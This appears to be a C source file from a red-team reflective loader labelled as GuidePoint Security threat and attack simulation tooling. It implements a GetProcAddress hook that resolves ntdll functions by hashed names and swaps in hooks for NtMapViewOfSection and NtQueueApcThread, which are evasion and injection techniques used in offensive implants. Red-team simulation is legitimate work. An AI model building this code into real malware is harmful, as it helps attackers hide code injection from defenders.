/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( LdrGetProcedureAddress );
	D_API( RtlInitAnsiString );
} API ;

#define H_API_LDRGETPROCEDUREADDRESS	0xfce76bb6
#define H_API_RTLINITANSISTRING		0xa0c8436d
#define H_LIB_NTDLL			0x1edab0ed

/*!
 *
 * Purpose:
 *
 * Searches for the requested function, else,
 * returns a hook to install if available.
 *
!*/
D_SEC( D ) PVOID WINAPI GetProcAddress_Hook( _In_ PVOID Image, _In_ PCHAR ExportName )
{
	API		Api;
	ANSI_STRING	Ani;

	PVOID		Ptr = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );

	Api.LdrGetProcedureAddress = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.RtlInitAnsiString      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );

	switch( HashString( ExportName, 0 ) ) {
		case 0xd6649bca:
			/* NtMapViewOfSection */
			Ptr = C_PTR( G_SYM( NtMapViewOfSection_Hook ) );
			break;
		case 0x0a6664b8:
			/* NtQueueApcThread */
			Ptr = C_PTR( G_SYM( NtQueueApcThread_Hook ) );
			break;
		default:
			Api.RtlInitAnsiString( &Ani, ExportName );
			Api.LdrGetProcedureAddress( Image, &Ani, 0, &Ptr );
			break;
	};
	return Ptr;
};
